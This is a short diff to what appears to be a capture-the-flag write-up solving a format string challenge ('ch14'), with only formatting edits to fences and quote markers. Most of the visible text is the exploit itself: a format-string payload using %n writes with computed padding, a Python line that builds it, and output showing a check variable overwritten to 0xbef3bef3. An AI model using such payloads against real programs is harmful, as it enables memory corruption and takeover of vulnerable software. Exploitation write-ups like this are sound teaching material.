@@ -128,11 +128,11 @@ because the result is
 ./ch14 `cat input`
 check at 0xffffd638
 argv[1] = [8���:���%48875d%9$n%10$n]
+```
 
 You are on the right way !
 fmt=[]
 check=0xbef3bef3
-```
 now the check is at 0xffffd638 !!
 and we change check become 0xbef3bef3 ? 0xbeef ?
 >ok we try get 48875-4 be cause we already add 1 address with 4 byte
@@ -145,8 +145,8 @@ padding ="%48871d%9$n"
 padding +="%8126d%10$n"
 print address + address2 + padding
 ```
->48875-4 =48871
->%8126d added
+48875-4 =48871
+%8126d added
 the result is 
 ```
 ./ch14 `cat input`
